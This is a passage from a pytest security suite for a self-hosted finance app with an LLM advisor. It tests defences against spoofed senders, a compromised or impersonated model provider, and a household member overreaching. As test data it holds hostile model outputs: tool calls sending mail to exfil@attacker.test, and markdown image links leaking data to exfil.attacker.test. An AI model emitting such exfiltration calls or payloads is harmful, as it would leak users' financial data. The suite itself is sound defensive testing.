        assert len(session.exec(select(Bill)).all()) == bills
        assert session.exec(select(Bill).where(Bill.name == "Example Lending")).one().amount == 120.0
        assert {f.status for f in session.exec(select(ExtractedFact)).all()} <= {"pending", "auto"}


@pytest.mark.parametrize("space", ["\xa0", "\u2009", "\t", "\u202f"])
def test_b_a_typographic_space_classifies_as_a_plain_one(space: str):
    """"Your&nbsp;pay&nbsp;statement" read as nothing at all, so a notice went unseen by every check after it."""
    assert classify("hr@example.test", f"Your{space}pay{space}statement")[0] == classify("hr@example.test", "Your pay statement")[0] == "paystub"
    assert classify("x@example.test", "Hello", f"Amount{space}due $40.00")[0] == "bill_due"


def test_b_a_written_message_id_with_no_verdict_is_not_the_verified_message(owner: TestClient, monkeypatch):
    monkeypatch.setattr(notify, "send", lambda *a, **k: {"ok": True})

    def message(auth_results: str = "") -> bytes:
        head = f"Authentication-Results: {auth_results}\r\n" if auth_results else ""
        return (head + "From: Capital One <alerts@capitalone.com>\r\nTo: owner@example.test\r\nSubject: Your bill is due\r\nMessage-ID: <real@capitalone.com>\r\n"
                "Date: Tue, 13 Oct 2026 09:00:00 +0000\r\nContent-Type: text/plain\r\n\r\nAmount due $120.00 on 10/20/2026.\r\n").encode()

    with Session(engine) as session:
        box = _mailbox(session)
        handle_message(session, box, "INBOX", 1, parse_message(message(passed("capitalone.com"))), TODAY)
        session.commit()
        handle_message(session, box, "INBOX", 2, parse_message(message()), TODAY)  # the same From and id, and nothing says who sent it
        session.commit()
        refs = {r.uid: r for r in session.exec(select(MessageRef)).all()}
        assert sorted(refs) == [1, 2] and refs[1].trust == "ok" and refs[2].trust == "unknown"
        # What the owner marked genuine stays one message however a copy reads.
        refs[1].trust_why = "You marked this sender as genuine."
        session.add(refs[1])
        session.commit()
        assert handle_message(session, box, "INBOX", 7, parse_message(message()), TODAY) == {"seen": True}




def test_b_the_brief_does_not_name_a_sender_it_could_not_vouch_for(owner: TestClient):
    """"Capital One sent an overdraft alert" and "Past-due notices in the mail from Capital One", critical and pushed each
    morning, from a domain the attacker signs: the brief says it by the name the attacker wrote."""
    with Session(engine) as session:
        box = _mailbox(session)
        _land(session, box, _raw("alerts@capitalonebank.test", "Capital One", "Your account is overdrawn", "Overdrawn by $77.00", passed("capitalonebank.test")))
        _land(session, box, _raw("alerts@capitalonebank.test", "Capital One", "Your payment is past due", "Past due. Amount due $950.00 by 10/18/2026.", passed("capitalonebank.test")))
    with Session(engine) as session:
        brief = " ".join(b["text"] for b in finance_snapshot(session, TODAY)["brief"])
    assert "Capital One" not in brief, brief


def test_b_answering_together_leaves_a_sender_it_could_not_vouch_for_to_its_own_card(owner: TestClient):
    with Session(engine) as session:
        session.add(Bill(name="Capital One", amount=120.0, due_day=20))
        session.commit()
        box = _mailbox(session)
        _, (fact, *_) = _land(session, box, _raw("alerts@capitalonebank.test", "Capital One", "Your bill is due", "Amount due $480.00 on 10/20/2026.", passed("capitalonebank.test")))
        step = plan_many(session, [fact], TODAY)["steps"][0]
    assert step["do"] == "own_card", step


def test_b_a_notice_nobody_can_vouch_for_never_makes_a_real_one_the_older(owner: TestClient):
    with Session(engine) as session:
        session.add(Bill(name="Capital One", amount=120.0, due_day=20))
        session.commit()
        box = _mailbox(session)
        _, (real, *_) = _land(session, box, _raw("alerts@capitalone.com", "Capital One", "Your bill is due", "Amount due $120.00 on 10/20/2026.", passed("capitalone.com")))
        _land(session, box, _raw("alerts@capitalonebank.test", "Capital One", "Your bill is due", "Amount due $480.00 on 11/20/2026.", passed("capitalonebank.test")))
        step = plan_many(session, [real], TODAY)["steps"][0]
    assert step["do"] != "set_aside", step


# ---- c. a compromised model provider -------------------------------------------------------------------------------


def _seed_mail(session: Session) -> None:
    box = _mailbox(session)
    ref = MessageRef(account_id=box.id, folder="INBOX", uid=1, message_id="<c@example.test>", sender="billing@secretlender.test", sender_name="Secret Lender", subject="MAILSUBJECT", snippet="MAILSNIPPET account 4242", kind="bill_due", trust="ok",
                     date=datetime(2026, 10, 10, tzinfo=timezone.utc))
    session.add(ref)
    session.commit()
    session.refresh(ref)
    session.add(ExtractedFact(kind="bill_due", message_ref_id=ref.id, fields=json.dumps({"amount": 480.0, "due_date": "2026-10-20", "name": "Secret Lender", "sender": ref.sender, "subject": ref.subject}), confidence=0.9, status="pending", excerpt="FACTEXCERPT", produced_by="rule"))
    session.commit()


def _chat(provider) -> list[dict]:  # noqa: ANN001
    async def collect():
        return [e async for e in advise([{"role": "user", "content": "What is due?"}], provider=provider, session_factory=session_scope, today=TODAY)]

    return asyncio.run(collect())


@pytest.mark.parametrize("cloud", ["anthropic", "openai"])
def test_c_a_cloud_model_never_gets_the_mails_search_or_its_excerpts(cloud):
    """"With the plan and never the mail": the search handed over each message's sender, subject and first 200
    characters, and the waiting facts each excerpt, at "full", the default."""
    with Session(engine) as session:
        seed(session)
        _seed_mail(session)

    class Cloud(Scripted):
        id = cloud

    offered: list[str] = []

    class Watching(Cloud):
        async def chat(self, messages, tools=None, *, max_tokens=1024):  # noqa: ANN001, ANN201
            offered.extend(t.name for t in tools or [])
            async for event in super().chat(messages, tools, max_tokens=max_tokens):
                yield event

    provider = Watching([[Event("tool_call", id="1", name="mail_search", arguments={}), Event("tool_call", id="2", name="facts_pending", arguments={})], [Event("text", text="Done.")]])
    events = _chat(provider)
    assert events[-1]["type"] == "done"
    assert not (BODY_TOOLS & set(offered)), offered
    sent = json.dumps(provider.seen)
    for word in ("MAILSUBJECT", "MAILSNIPPET", "FACTEXCERPT", "secretlender"):
        assert word not in sent, word
    answers = [m for m in provider.seen[1] if m.get("role") == "tool"]
    assert all("not available in the chat" in m["content"] for m in answers)
    with Session(engine) as session:
        assert {"mail_search_refused", "facts_pending_refused"} <= {a.tool for a in session.exec(select(AuditEntry)).all()}


def test_c_a_cloud_model_is_not_told_this_servers_names():
    """The run summaries and the next steps quote a mailbox's host, the published address and the last errors."""
    with Session(engine) as session:
        seed(session)
        box = _mailbox(session)
        box.last_error, box.host = "Nothing answers at imap.secrethost.test", "imap.secrethost.test"
        session.add(box)
        set_setting(session, "selfcheck", {"at": "now", "problems": ["imap.secrethost.test failed"], "public": "https://money.secrethost.test"})

    class Cloud(Scripted):
        id = "anthropic"

    away = Cloud([[Event("tool_call", id="1", name="jobs_status", arguments={}), Event("tool_call", id="2", name="next_steps", arguments={})], [Event("text", text="Done.")]])
    _chat(away)
    answers = [m["content"] for m in away.seen[1] if m.get("role") == "tool"]
    assert len(answers) == 2 and "secrethost" not in "".join(answers), answers
    home = Scripted([[Event("tool_call", id="1", name="next_steps", arguments={})], [Event("text", text="Done.")]])
    _chat(home)
    assert "secrethost" in json.dumps(home.seen[1])  # the model on the box may say what is wrong


def test_c_the_body_of_the_mail_is_still_the_local_models_when_the_owner_says_full():
    with Session(engine) as session:
        seed(session)
        _seed_mail(session)
    provider = Scripted([[Event("tool_call", id="1", name="mail_search", arguments={})], [Event("text", text="Done.")]])  # no address: the app's own, in-process
    _chat(provider)
    assert "MAILSNIPPET" in json.dumps(provider.seen[1])


class _Wire:
    """A provider's server: every request kept, one answer given, and what the app offered it read back."""

    def __init__(self, reply: str = "Done.") -> None:
        self.requests: list[httpx.Request] = []
        self.reply = reply

    def handler(self, request: httpx.Request) -> httpx.Response:
        self.requests.append(request)
        body = "data: " + json.dumps({"choices": [{"delta": {"content": self.reply}}]}) + "\n\ndata: [DONE]\n\n"
        return httpx.Response(200, text=body, headers={"content-type": "text/event-stream"})

    def offered(self) -> set[str]:
        return {t["function"]["name"] for t in json.loads(self.requests[0].content).get("tools", [])}


@pytest.mark.parametrize("address,local", [("http://127.0.0.1:11434", True), ("http://localhost:11434", True), ("http://host.docker.internal:11434", True), ("http://192.168.1.20:11434", True), ("http://100.64.3.2:11434", True),
                                           ("http://[fd00::1]:11434", True), ("https://8.8.8.8:11434", False), ("https://1.1.1.1", False)])
def test_c_ollama_on_the_internet_is_treated_as_a_cloud(address: str, local: bool):
    """The owner was told Ollama is at home and a cloud never gets the mail; the check read the provider's name, so
    "Ollama" at any address on the internet was offered every message and document."""
    with Session(engine) as session:
        seed(session)
    wire = _Wire()
    provider = Ollama("m", address, client=httpx.AsyncClient(transport=httpx.MockTransport(wire.handler)))
    assert off_the_box(provider) is (not local)
    _chat(provider)
    assert bool(BODY_TOOLS & wire.offered()) is local, wire.offered()


def test_c_a_name_that_does_not_resolve_is_not_home():
    assert stays_home("http://no-such-name.invalid:11434") is False
    assert stays_home("") is False
    assert stays_home("not a url") is False


def test_c_the_privacy_page_tells_ollama_at_home_from_ollama_on_the_internet(owner: TestClient):
    assert owner.put("/api/v1/models/advisor", json={"provider": "ollama", "base_url": "http://127.0.0.1:11434"}).status_code == 200
    model = owner.get("/api/v1/privacy").json()["models"][0]
    assert model["local"] is True and "own computer" in model["where"] and "your mail" in model["sees"]
    assert owner.put("/api/v1/models/advisor", json={"provider": "ollama", "base_url": "https://8.8.8.8"}).status_code == 200
    page = owner.get("/api/v1/privacy").json()
    model = page["models"][0]
    assert model["local"] is False and "internet" in model["where"] and "Never the mail" in model["sees"]
    assert any(leave["service"] == "An Ollama server on the internet" and leave["on"] for leave in page["leaves"])
    assert owner.put("/api/v1/models/advisor", json={"provider": "anthropic", "base_url": ""}).status_code == 200
    assert "Never the mail" in owner.get("/api/v1/privacy").json()["models"][0]["sees"]


def test_c_the_reviewer_is_never_told_an_account_or_a_banks_name():
    """"Never account names": held only for the list of accounts, while a card's name rode as the debt's and the brief's."""
    with Session(engine) as session:
        seed(session)
        names = {w for a in session.exec(select(Account)).all() for w in (a.name, a.institution) if w}
        pack = reviewer.packet(session, TODAY)
    prompt = reviewer.prompt_for(pack, "request")
    for name in names:
        assert name not in prompt, name
    assert "card" in json.dumps(pack["plan"]["debts"])


def test_c_a_reviewers_note_is_plain_and_bounded():
    long = "Your plan is off. ‮evil‬\x00 " + "word " * 500_000
    notes = reviewer.parse_notes(json.dumps({"notes": [{"kind": "tighten", "text": long, "action": {"type": "rule", "text": "A rule‮\nsecond line"}}]}), set())
    assert len(notes[0]["text"]) <= reviewer.MAX_NOTE_CHARS and "‮" not in notes[0]["text"] and "\x00" not in notes[0]["text"]
    assert notes[0]["action"]["text"] == "A rule second line"


def test_c_a_reply_cannot_ask_for_thousands_of_calls():
    """2 MB of stream fits forty thousand calls a round: each a query, a live IMAP fetch or an audit row."""
    with Session(engine) as session:
        seed(session)
    many = [Event("tool_call", id=f"c{i}", name="glance", arguments={}) for i in range(500)]
    provider = Scripted([many, [Event("text", text="Done.")]])
    events = _chat(provider)
    assert len([e for e in events if e["type"] == "tool"]) == MAX_CALLS_PER_ROUND
    sent = provider.seen[1]
    assert len([m for m in sent if m.get("role") == "tool"]) == MAX_CALLS_PER_ROUND
    assert len(next(m for m in sent if m.get("role") == "assistant")["tool_calls"]) == MAX_CALLS_PER_ROUND  # every call asked for is answered, as a provider wants
    with Session(engine) as session:
        assert "too_many_tool_calls_refused" in {a.tool for a in session.exec(select(AuditEntry)).all()}


def _hostile_list(body: bytes):  # noqa: ANN202
    return httpx.AsyncClient(transport=httpx.MockTransport(lambda request: httpx.Response(200, content=body)))


def test_c_a_model_list_is_read_to_a_ceiling_and_a_shape_never_breaks_anything():
    huge = json.dumps({"models": [{"name": "m" * 100}] * 100_000}).encode()
    assert len(huge) > MAX_LIST_BYTES
    with pytest.raises(StreamTooLong):
        asyncio.run(Ollama("m", "http://127.0.0.1:11434", client=_hostile_list(huge)).list_models())
    with pytest.raises(StreamTooLong):
        asyncio.run(OpenAICompatible("m", "http://llm.test/v1", client=_hostile_list(huge)).list_models())
    for shape in (b"[]", b'{"models": 5}', b'{"models": [1, {"name": 5}, {"name": "ok"}]}', b'"x"'):
        got = asyncio.run(Ollama("m", "http://127.0.0.1:11434", client=_hostile_list(shape)).list_models())
        assert got in ([], ["ok"]), shape


def test_c_a_hostile_ollama_after_no_such_model_holds_nothing():
    """The chat asks for the list by itself after a "no such model" answer: a list that never ends is an error, not memory."""
    huge = json.dumps({"models": [{"name": "m" * 100}] * 100_000}).encode()

    def handler(request: httpx.Request) -> httpx.Response:
        if request.url.path.endswith("/api/tags"):
            return httpx.Response(200, content=huge)
        return httpx.Response(404, json={"error": {"message": "model not found", "type": "not_found_error"}})

    provider = Ollama("m", "http://127.0.0.1:11434", client=httpx.AsyncClient(transport=httpx.MockTransport(handler)))

    async def collect():
        return [e async for e in provider.chat([{"role": "user", "content": "hi"}], None)]

    events = asyncio.run(collect())
    assert [e.type for e in events] == ["error"], events


def test_c_totals_only_holds_the_owners_rules_and_goals_back():
    with Session(engine) as session:
        seed(session)
        set_setting(session, "rules", "RULESECRET keep Example Bank above 500")
        set_setting(session, "goals", "GOALSECRET the move to Example Town")
        roles.save_role(session, "advisor", {"sees": "full"})
        assert "RULESECRET" in system_prompt(session, TODAY)[0]
        roles.save_role(session, "advisor", {"sees": "merchants"})
        assert "GOALSECRET" in system_prompt(session, TODAY)[0]
        roles.save_role(session, "advisor", {"sees": "aggregates"})
        prompt = system_prompt(session, TODAY)[0]
    assert "RULESECRET" not in prompt and "GOALSECRET" not in prompt


def test_c_nothing_a_scripted_provider_says_writes_anything(owner: TestClient):
    """Every write it could name is refused; its words are words. The chat page renders them as text (no markup, no
    images, no links: frontend/src/pages/Chat.tsx) under a policy that loads images from the app alone."""
    with Session(engine) as session:
        seed(session)
        _seed_mail(session)
        fact = session.exec(select(ExtractedFact).where(ExtractedFact.status == "pending")).first()
        bills_before = len(session.exec(select(Bill)).all())
    writes = [("facts_confirm", {"fact_id": fact.id}), ("mail_send_request", {"to": "exfil@attacker.test", "subject": "s", "body": "b"}), ("notes_remember", {"text": "x"}), ("approve", {"id": 1})]
    provider = Scripted([[Event("tool_call", id=f"w{i}", name=n, arguments=a) for i, (n, a) in enumerate(writes)],
                         [Event("text", text="![x](https://exfil.attacker.test/p.png?d=SECRET) <img src=https://exfil.attacker.test/a> [click](https://exfil.attacker.test/)")]])
    events = _chat(provider)
    assert events[-1]["type"] == "done"
    with Session(engine) as session:
        assert session.get(ExtractedFact, fact.id).status == "pending" and len(session.exec(select(Bill)).all()) == bills_before
        assert not session.exec(select(Approval)).all()
    if CHAT_PAGE.exists():  # a checkout without the frontend has no page to read
        page = CHAT_PAGE.read_text(encoding="utf-8")
        assert "dangerouslySetInnerHTML" not in page and "markdown" not in page.lower()
    assert "img-src 'self' data: blob:;" in APP_CSP and "script-src 'self' https://cdn.plaid.com https://cdn.teller.io;" in APP_CSP


def test_c_a_refused_call_lends_the_reply_no_figure_and_the_screen_no_tool(owner: TestClient):
    """A "tool" called "$9,999.00" was refused in words holding that figure, which then counted as the engine's; and the
    owner's screen said "mail_send_request, 1 rows" of a send that never ran."""
    with Session(engine) as session:
        seed(session)
    provider = Scripted([[Event("tool_call", id="1", name="pay $9,999.00", arguments={}), Event("tool_call", id="2", name="mail_send_request", arguments={"to": "x@attacker.test", "subject": "s", "body": "b"}),
                          Event("tool_call", id="3", name="glance", arguments={"nonsense": "$8,888.00"})],
                         [Event("text", text="You owe $9,999.00 and $8,888.00.")]])
    done = _chat(provider)[-1]
    assert {"$9,999.00", "$8,888.00"} <= set(done["unverified"]), done
    rows = {u["name"]: u["rows"] for u in done["used"]}
    assert rows["mail_send_request"] == 0 and rows["pay $9,999.00"] == 0


@pytest.mark.parametrize("deep", [b"[" * 500_000, b'{"models":' * 100_000])
def test_c_a_model_list_nested_past_the_stack_is_an_error_not_a_crash(deep: bytes):
    with pytest.raises(ValueError):
        asyncio.run(Ollama("m", "http://127.0.0.1:11434", client=_hostile_list(deep)).list_models())


# ---- d. a family member with "everything" ---------------------------------------------------------------------------


def test_d_where_the_models_are_is_the_owners(owner: TestClient):
    person = _everything(owner)
    assert person.get("/api/v1/models").status_code == 200  # they see it
    for attempt in (lambda: person.put("/api/v1/models/advisor", json={"provider": "ollama", "base_url": "https://models.attacker.test"}), lambda: person.put("/api/v1/models/advisor", json={"sees": "full"}),
                    lambda: person.put("/api/v1/models/reviewer", json={"provider": "openai", "base_url": "https://models.attacker.test/v1"}), lambda: person.put("/api/v1/models/secrets", json={"name": "anthropic", "value": "sk-attacker"}),
                    lambda: person.post("/api/v1/models/catalog", json={"provider": "ollama", "base_url": "http://bridge:143"})):
        assert attempt().status_code == 403
    assert "attacker" not in json.dumps(owner.get("/api/v1/models").json())
    assert owner.put("/api/v1/models/advisor", json={"provider": "ollama", "base_url": "http://127.0.0.1:11434"}).status_code == 200


def test_d_a_connected_app_is_the_owners_to_change_and_a_key_its_makers(owner: TestClient, monkeypatch):
    pushed: list[str] = []
    monkeypatch.setattr(notify, "send", lambda session, title, body="", **k: pushed.append(title) or {"ok": True})
    person = _everything(owner)
    phone = _oauth("FinancialAuthority for iPhone and iPad")
    assert person.delete(f"/api/v1/oauth/clients/{phone['client_id']}").status_code == 403
    assert person.put(f"/api/v1/oauth/clients/{phone['client_id']}", json={"redaction": "full"}).status_code == 403
    assert TestClient(app).get("/api/v1/glance", headers=phone["h"]).status_code == 200
    with Session(engine) as session:
        owners, _ = auth.create_key(session, "Owner script", {"read"})
        owners_id = owners.id
    assert person.delete(f"/api/v1/keys/{owners_id}").status_code == 403
    theirs = person.post("/api/v1/keys", json={"name": "theirs", "scopes": ["read", "confirm"]}).json()
    assert any("Sam Example made an API key" in t for t in pushed), pushed  # the owner hears of a credential that reads from outside
    assert person.delete(f"/api/v1/keys/{theirs['id']}").status_code == 200
    assert owner.delete(f"/api/v1/keys/{owners_id}").status_code == 200
    with Session(engine) as session:
        assert session.get(ApiKey, owners_id).revoked_at is not None


def test_d_who_sees_an_account_is_the_owners_to_say(owner: TestClient):
    with Session(engine) as session:
        seed(session)
        private = session.exec(select(Account)).first()
        pid = private.id
    person = _everything(owner)
    me = person.get("/api/auth/me").json()["person_id"]
    assert person.put(f"/api/v1/accounts/{pid}/sharing", json={"shared": True}).status_code == 403
    assert person.put(f"/api/v1/accounts/{pid}/sharing", json={"shared": False, "person_id": me}).status_code == 403
    assert owner.put(f"/api/v1/accounts/{pid}/sharing", json={"shared": True}).status_code == 200


def test_d_a_mailbox_is_changed_only_by_whoever_added_it_and_a_persons_ends_with_them(owner: TestClient, monkeypatch):
    pushed: list[str] = []
    monkeypatch.setattr(notify, "send", lambda session, title, body="", **k: pushed.append(title) or {"ok": True})
    with Session(engine) as session:
        box = _mailbox(session)
        box.smtp_host, box.smtp_port = "smtp.example.test", 465
        session.add(box)
        session.commit()
        owners = box.id
    person = _everything(owner)
    pid = person.get("/api/auth/me").json()["person_id"]
    # With a password typed, moving it used to pass: the owner's approved sends went there, and whatever it served was read as mail.
    assert person.put(f"/api/v1/mail/accounts/{owners}", json={"smtp_host": "smtp.attacker.test", "password": "anything"}).status_code == 403
    assert person.put(f"/api/v1/mail/accounts/{owners}", json={"host": "imap.attacker.test", "password": "anything"}).status_code == 403
    assert person.put(f"/api/v1/mail/accounts/{owners}", json={"folders": "Archive"}).status_code == 403  # read nothing, and nothing says so
    assert person.delete(f"/api/v1/mail/accounts/{owners}").status_code == 403
    theirs = person.post("/api/v1/mail/accounts", json={"kind": "imap", "host": "imap.attacker.test", "username": "sam@attacker.test", "password": "theirs", "label": "Sam's"}).json()
    assert any("Sam Example connected a mailbox" in t for t in pushed), pushed
    assert person.put(f"/api/v1/mail/accounts/{theirs['id']}", json={"label": "Sam's own"}).status_code == 200
    assert person.put(f"/api/v1/mail/accounts/{theirs['id']}", json={"host": "imap2.attacker.test", "password": "theirs"}).status_code == 200
    assert owner.put(f"/api/v1/mail/accounts/{owners}", json={"label": "Household mail"}).status_code == 200
    # Their access ends: mail from a server of theirs is theirs to write, so it is read no further.
    assert owner.delete(f"/api/v1/people/{pid}").status_code == 200
    with Session(engine) as session:
        gone, kept = session.get(MailAccount, theirs["id"]), session.get(MailAccount, owners)
        assert gone.active is False and gone.password_enc == "" and kept.active is True


def test_d_the_owners_standing_on_a_sender_is_the_owners(owner: TestClient):
    with Session(engine) as session:
        box = _mailbox(session)
        _, (fact, *_) = _land(session, box, _raw("alerts@capital0ne.test", "Capital One", "Your bill is due", "Amount due $480.00 on 10/20/2026.", passed("capital0ne.test")))
        ref_id = fact.message_ref_id
    person = _everything(owner)
    owner.post("/api/v1/data-check/run")
    assert person.post("/api/v1/data-check/answer", json={"key": f"sender:{ref_id}", "action": "trust"}).status_code == 403
    assert owner.post("/api/v1/data-check/answer", json={"key": f"sender:{ref_id}", "action": "trust"}).status_code == 200


def test_d_a_second_person_replaces_only_a_calendar_feed_they_made(owner: TestClient):
    person = _everything(owner)
    assert owner.post("/api/v1/calendar/feed", json={"amounts": False}).status_code == 200
    assert person.post("/api/v1/calendar/feed", json={"amounts": True}).status_code == 403
    assert person.delete("/api/v1/calendar/feed").status_code == 403
    assert owner.delete("/api/v1/calendar/feed").status_code == 200
    assert person.post("/api/v1/calendar/feed", json={"amounts": False}).status_code == 200
    assert person.delete("/api/v1/calendar/feed").status_code == 200


def test_d_whose_bank_keys_and_the_models_switch_are_the_owners(owner: TestClient):
    """Plaid keys of theirs broke the owner's links and took the next one through an account of theirs; both stayed after
    their access ended. The switch on Privacy reached what Models refused."""
    person = _everything(owner)
    assert person.put("/api/v1/banks/plaid/settings", json={"client_id": "theirs", "secret": "theirs", "environment": "sandbox"}).status_code == 403
    assert person.put("/api/v1/banks/teller/settings", json={"application_id": "theirs"}).status_code == 403
    assert person.post("/api/v1/privacy/models/advisor", json={"on": True}).status_code == 403
    assert person.post("/api/v1/privacy/models/advisor", json={"on": False}).status_code == 403
    assert owner.post("/api/v1/privacy/models/advisor", json={"on": False}).status_code == 200
    assert owner.put("/api/v1/banks/teller/settings", json={"environment": "sandbox"}).status_code == 200


def test_d_mail_through_a_second_persons_mailbox_is_only_that_servers_word(owner: TestClient, monkeypatch):
    """On a server of theirs they write "dmarc=pass" for any From: a lender's statement landed with no tap, a domain was
    learned as a brand's and an app could confirm it."""
    read: list[str] = []
    monkeypatch.setattr("app.engine.borrowing.statement_fact_from_file", lambda *a, **k: read.append("read"))
    monkeypatch.setattr(notify, "send", lambda *a, **k: {"ok": True})
    person = _everything(owner)
    pid = person.get("/api/auth/me").json()["person_id"]
    with Session(engine) as session:
        box = MailAccount(label="Theirs", kind="imap", host="imap.attacker.test", username="sam@attacker.test", password_enc=crypto.encrypt("pw"), person_id=pid)
        session.add(box)
        session.commit()
        session.refresh(box)
        ref, (fact, *_) = _land(session, box, _with_pdf("notice@affirm.com", "Affirm", [passed("affirm.com")]))
        fid, trust, why = fact.id, ref.trust, ref.trust_why
        assert not read and trust == "warn" and "second person" in why
        _land(session, box, _raw("billing@capital-one-loans.test", "Capital One", "Your bill is due", "Amount due $1.00 on 10/20/2026.", passed("capital-one-loans.test")))
        _forget_learned()
        from app.engine.datacheck import learned_senders

        assert "capital-one-loans.test" not in learned_senders(session).get("capital one", set())
    assert _key({"read", "confirm"}).post(f"/api/v1/facts/{fid}/confirm", json={}).status_code == 403
    assert person.post(f"/api/v1/facts/{fid}/confirm", json={}).status_code == 200  # a person still answers for their own mail


def test_d_a_second_persons_confirmation_vouches_for_nothing(owner: TestClient, monkeypatch):
    """Marking a sender genuine is the owner's; confirming one of its messages had the same effect by another door, and
    outlasted the person's access."""
    monkeypatch.setattr(notify, "send", lambda *a, **k: {"ok": True})
    person = _everything(owner)
    with Session(engine) as session:
        box = _mailbox(session)
        _, (first, *_) = _land(session, box, _raw("billing@attacker.test", "Example Lending", "Your bill is due", "Amount due $120.00 on 10/20/2026.", passed("attacker.test")))
        _, (second, *_) = _land(session, box, _raw("billing@attacker.test", "Example Lending", "Your bill is due", "Amount due $125.00 on 11/20/2026.", passed("attacker.test")))
        first_id, second_id = first.id, second.id
    assert person.post(f"/api/v1/facts/{first_id}/confirm", json={}).status_code == 200
    with Session(engine) as session:
        assert "attacker.test" not in vouched_domains(session)
    assert _key({"read", "confirm"}).post(f"/api/v1/facts/{second_id}/confirm", json={}).status_code == 403


def test_d_the_owners_send_never_goes_through_a_second_persons_mailbox(owner: TestClient, monkeypatch):
    """With the owner's mailboxes unable to send, or one named on the draft, the owner's approved words went to a server
    a second person chose."""
    sent: list[str] = []
    monkeypatch.setattr(approvals, "SENDER", lambda account, password, **k: sent.append(account.host) or "<id@example.test>")
    person = _everything(owner)
    pid = person.get("/api/auth/me").json()["person_id"]
    with Session(engine) as session:
        theirs = MailAccount(label="Theirs", kind="imap", host="imap.attacker.test", username="sam@attacker.test", password_enc=crypto.encrypt("pw"), smtp_host="smtp.attacker.test", smtp_port=465, person_id=pid)
        session.add(theirs)
        session.commit()
        theirs_id = theirs.id
        assert approvals.sending_account(session, None) is None
        assert approvals.sending_account(session, theirs_id) is None
        assert approvals.sending_account(session, None, pid).id == theirs_id
        assert approvals.sending_account(session, theirs_id, pid).id == theirs_id
        mine = _mailbox(session)
        mine.smtp_host = "smtp.example.test"
        session.add(mine)
        session.commit()
        assert approvals.sending_account(session, None).id == mine.id
        assert approvals.sending_account(session, None, pid).id == theirs_id
        other = MailAccount(label="Other", kind="imap", host="imap.other.test", username="o@other.test", password_enc=crypto.encrypt("pw"), smtp_host="smtp.other.test", person_id=pid + 1)
        session.add(other)
        session.commit()
        assert approvals.sending_account(session, other.id, pid) is None
        session.delete(session.get(MailAccount, theirs_id))
        session.commit()
        assert approvals.sending_account(session, None, pid).id == mine.id  # with none of their own, the owner's: pushed to the owner


def test_d_every_other_path_the_story_named_stays_shut(owner: TestClient):
    """Restore, erase, the people page, a connected app, the off-box copy: refused. No route moves money. Reading every
    account is what the role says it does, on the page the owner grants it from."""
    person = _everything(owner)
    assert person.post("/api/v1/privacy/erase", json={"phrase": "delete everything", "password": PW}).status_code == 403
    assert person.post("/api/v1/restore-points/x/restore").status_code == 403
    assert person.get("/api/v1/people").status_code == 403
    assert person.post("/api/v1/people", json={"username": "other", "role": "everything"}).status_code == 403
    assert person.put("/api/v1/push", json={"kind": "ntfy", "url": "https://ntfy.attacker.test"}).status_code == 403
    assert person.put("/api/v1/restore-points/offbox", json={"folder": "/tmp"}).status_code == 403
    assert person.post("/api/v1/restore-points/offbox/copy").status_code == 403
    assert person.get("/api/v1/accounts").status_code == 200
    paths = {r.path for r in app.routes if hasattr(r, "path")}
    assert not [p for p in paths if any(word in p for word in ("/transfer", "/wire", "/ach/", "/send-money"))], "no route moves money"


# ---- e. another container on the box ---------------------------------------------------------------------------------


REGISTER = {"client_name": "An app", "redirect_uris": ["https://claude.ai/callback"], "token_endpoint_auth_method": "none", "grant_types": ["authorization_code", "refresh_token"], "response_types": ["code"], "scope": "read"}


def test_e_one_abandoned_registration_never_breaks_the_next(client: TestClient):
    """One POST from anyone (or a sign-in the owner gave up on), an hour's wait, and every later /register answered 500
    for good: the phone, the watch and Claude could never connect again, and nothing said why."""
    safe = TestClient(app, raise_server_exceptions=False)
    assert safe.post("/register", json=REGISTER).status_code == 201
    with Session(engine) as session:
        row = session.exec(select(OAuthClient)).one()
        row.created_at = utcnow() - timedelta(hours=2)
        session.add(row)
        session.commit()
    answer = safe.post("/register", json=REGISTER)
    assert answer.status_code == 201, answer.text
    with Session(engine) as session:
        assert len(session.exec(select(OAuthClient)).all()) == 1  # the abandoned one is forgotten, as the code meant


def test_e_a_client_holding_tokens_is_never_forgotten(client: TestClient, owner: TestClient):
    phone = _oauth("FinancialAuthority for iPhone and iPad")
    with Session(engine) as session:
        row = session.exec(select(OAuthClient).where(OAuthClient.client_id == phone["client_id"])).one()
        row.created_at, row.last_used_at = utcnow() - timedelta(hours=2), None
        session.add(row)
        session.commit()
    assert TestClient(app).post("/register", json=REGISTER).status_code == 201
    assert TestClient(app).get("/api/v1/glance", headers=phone["h"]).status_code == 200


@pytest.mark.parametrize("token", ["W10.W10.W10", "bnVsbA.bnVsbA.bnVsbA", "NQ.NQ.NQ", "e30.e30.e30"])
def test_e_a_webhook_token_of_any_shape_is_a_refusal_not_a_crash(token: str):
    safe = TestClient(app, raise_server_exceptions=False)
    assert safe.post("/api/plaid/webhook", headers={"plaid-verification": token}, content=b"{}").status_code == 401


def test_e_a_long_key_id_is_not_a_way_to_make_the_app_call_plaid():
    fetched: list[str] = []

    def fetch(kid: str) -> dict:
        fetched.append(kid)
        raise RuntimeError("unknown")

    def part(value: dict) -> str:
        return base64.urlsafe_b64encode(json.dumps(value).encode()).rstrip(b"=").decode()

    token = f"{part({'alg': 'ES256', 'kid': 'k' * 100})}.{part({})}.{part({})}"
    for _ in range(3):
        with pytest.raises(plaid_webhook.Refused):
            plaid_webhook.verify(token, b"{}", fetch)
    assert not fetched


def test_e_what_a_stranger_on_the_network_reads_without_a_credential(client: TestClient):
    assert client.get("/api/health").json() == {"ok": True, "demo": False}
    for path in ("/api/v1/snapshot", "/api/v1/mail/accounts", "/api/v1/models", "/api/version", "/api/v1/about"):
        assert client.get(path).status_code == 401, path
    assert client.post("/mcp", json={"jsonrpc": "2.0", "id": 1, "method": "tools/list"}, headers={"Accept": "application/json, text/event-stream"}).status_code == 401


def test_e_an_impersonated_ollama_can_say_anything_and_do_nothing():
    """The port the app calls Ollama on, answered by another container on the host's network: it asks to confirm, send
    and approve. It reads what the owner's level lets a local model read, while the owner chats; nothing it says acts."""
    with Session(engine) as session:
        seed(session)
        _seed_mail(session)
        roles.save_role(session, "advisor", {"sees": "aggregates"})
        fact = session.exec(select(ExtractedFact).where(ExtractedFact.status == "pending")).first()
    calls = [{"index": 0, "id": "a", "function": {"name": "facts_confirm", "arguments": json.dumps({"fact_id": fact.id})}}, {"index": 1, "id": "b", "function": {"name": "mail_send_request", "arguments": json.dumps({"to": "x@attacker.test", "subject": "s", "body": "b"})}}]
    requests: list[httpx.Request] = []

    def handler(request: httpx.Request) -> httpx.Response:
        requests.append(request)
